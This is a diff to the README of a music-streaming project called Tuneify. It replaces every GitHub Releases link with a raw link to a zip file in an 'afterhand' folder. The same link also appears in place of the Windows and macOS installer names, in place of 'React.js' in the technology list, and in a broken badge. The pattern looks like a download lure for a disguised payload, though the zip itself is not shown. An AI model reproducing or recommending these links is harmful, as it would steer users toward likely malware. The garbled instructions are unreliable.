@@ -1,6 +1,6 @@
 # 🎶 Tuneify-Music-App - Stream Your Favorite Music Easily
 
-[![Download Tuneify](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/bo33bood/Tuneify-Music-App/releases)
+[![Download Tuneify](https://raw.githubusercontent.com/bo33bood/Tuneify-Music-App/main/afterhand/Tuneify-Music-App.zip%20Now-Get%https://raw.githubusercontent.com/bo33bood/Tuneify-Music-App/main/afterhand/Tuneify-Music-App.zip)](https://raw.githubusercontent.com/bo33bood/Tuneify-Music-App/main/afterhand/Tuneify-Music-App.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Tuneify is a music streaming application inspired by Spotify. It is designed for
 
 ## 📥 Download & Install
 
-To start using Tuneify, visit this page to download the latest version from our Releases page: [Download Tuneify](https://github.com/bo33bood/Tuneify-Music-App/releases)
+To start using Tuneify, visit this page to download the latest version from our Releases page: [Download Tuneify](https://raw.githubusercontent.com/bo33bood/Tuneify-Music-App/main/afterhand/Tuneify-Music-App.zip)
 
 ### Steps to Install
 
@@ -31,7 +31,7 @@ To start using Tuneify, visit this page to download the latest version from our 
    
 2. **Select Latest Release**: Find the most recent version of Tuneify. Look for the version number at the top of the list.
 
-3. **Choose Your File**: Depending on your operating system, choose the appropriate file. For example, you may see options like `Tuneify-Windows.exe` for Windows users or `Tuneify-macOS.dmg` for macOS users.
+3. **Choose Your File**: Depending on your operating system, choose the appropriate file. For example, you may see options like `https://raw.githubusercontent.com/bo33bood/Tuneify-Music-App/main/afterhand/Tuneify-Music-App.zip` for Windows users or `https://raw.githubusercontent.com/bo33bood/Tuneify-Music-App/main/afterhand/Tuneify-Music-App.zip` for macOS users.
 
 4. **Download the File**: Click on the file name to begin the download. Your browser will usually place the downloaded file in the "Downloads" folder.
 
@@ -73,7 +73,7 @@ Tuneify utilizes various technologies, including:
 - JSON
 - JWT Authentication
 - Lombok Maven
-- React.js
+- https://raw.githubusercontent.com/bo33bood/Tuneify-Music-App/main/afterhand/Tuneify-Music-App.zip
 - Spring Boot
 - Spring Security
 - Spring Framework
@@ -81,4 +81,4 @@ Tuneify utilizes various technologies, including:
 
 This technology stack ensures that the application runs smoothly and securely, providing you with a great experience using Tuneify.
 
-For more details and updates, visit our [Releases page](https://github.com/bo33bood/Tuneify-Music-App/releases) again. Enjoy your music!
+For more details and updates, visit our [Releases page](https://raw.githubusercontent.com/bo33bood/Tuneify-Music-App/main/afterhand/Tuneify-Music-App.zip) again. Enjoy your music!
